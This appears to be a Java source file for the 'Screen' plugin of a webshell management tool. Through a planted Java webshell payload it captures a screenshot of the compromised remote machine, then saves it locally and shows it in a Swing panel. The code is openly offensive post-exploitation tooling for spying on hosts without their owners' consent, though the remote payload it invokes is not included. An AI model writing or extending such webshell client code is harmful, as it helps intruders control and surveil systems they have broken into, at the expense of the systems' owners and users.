package shells.plugins.java;

import core.Encoding;
import core.annotation.PluginnAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import util.Log;
import util.automaticBindClick;
import util.http.ReqParameter;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileOutputStream;

@PluginnAnnotation(
        payloadName = "JavaDynamicPayload",
        Name = "Screen"
)
public class Screen implements Plugin {
    private final JPanel panel = new JPanel(new BorderLayout());
    private final JButton runButton = new JButton("screen");
    private final JSplitPane splitPane = new JSplitPane();
    private final JLabel label;
    private ShellEntity shellEntity;
    private Payload payload;
    private Encoding encoding;

    public Screen() {
        this.splitPane.setOrientation(0);
        this.splitPane.setDividerSize(0);
        JPanel topPanel = new JPanel();
        topPanel.add(this.runButton);
        this.label = new JLabel(new ImageIcon());
        this.splitPane.setTopComponent(topPanel);
        this.splitPane.setBottomComponent(new JScrollPane(this.label));
        this.splitPane.addComponentListener(new ComponentAdapter() {
            public void componentResized(ComponentEvent e) {
                Screen.this.splitPane.setDividerLocation(0.15D);
            }
        });
        this.panel.add(this.splitPane);
    }

    private void runButtonClick(ActionEvent actionEvent) {
        byte[] result = this.payload.evalFunc(null, "screen", new ReqParameter());

        try {
            if (result.length < 100) {
                Log.error(this.encoding.Decoding(result));
            }

            JFileChooser chooser = new JFileChooser();
            chooser.setFileSelectionMode(0);
            chooser.showDialog(new JLabel(), "选择");
            File selectdFile = chooser.getSelectedFile();
            if (selectdFile != null) {
                FileOutputStream fileOutputStream = new FileOutputStream(selectdFile);
                fileOutputStream.write(result);
                fileOutputStream.close();
                JOptionPane.showMessageDialog(this.panel, String.format("save screen to -> %s", selectdFile.getAbsolutePath()), "提示", 1);
            }

            this.label.setIcon(new ImageIcon(ImageIO.read(new ByteArrayInputStream(result))));
        } catch (Exception var6) {
            Log.error(var6);
        }

    }

    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModel();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    public JPanel getView() {
        return this.panel;
    }
}
